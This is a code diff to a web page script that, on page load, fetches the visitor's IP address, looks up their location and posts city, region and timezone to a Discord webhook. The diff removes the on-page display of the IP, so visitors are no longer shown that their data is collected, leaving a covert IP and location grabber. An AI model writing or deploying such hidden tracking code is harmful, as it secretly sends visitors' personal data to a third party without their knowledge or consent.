@@ -7,9 +7,6 @@
 </head>
 <body>
 
-<!-- Display the user's IP address on the webpage -->
-<p>User's IP Address: <span id="ipAddress"></span></p>
-
 <script>
   // Function to fetch user's IP address
   async function getIpAddress() {
@@ -36,10 +33,9 @@
             title: "User Information",
             color: 0x3498db, // Set the color of the embed (Hex color code)
             fields: [
-                { name: "ip", value: ipAddress },
-                { name: "city", value: city, inline: true },
-                { name: "region", value: region, inline: true },
-                { name: "timezone", value: timezone, inline: true },
+                { name: "City", value: city, inline: true },
+                { name: "Region", value: region, inline: true },
+                { name: "Timezone", value: timezone, inline: true },
             ],
         }],
     };
@@ -58,9 +54,6 @@
   async function main() {
     try {
       const ipAddress = await getIpAddress();
-      // Display the user's IP address on the webpage
-      document.getElementById('ipAddress').innerText = ipAddress;
-      
       const locationInfo = await getLocationInfo(ipAddress);
       await sendToDiscord(ipAddress, locationInfo);
     } catch (error) {
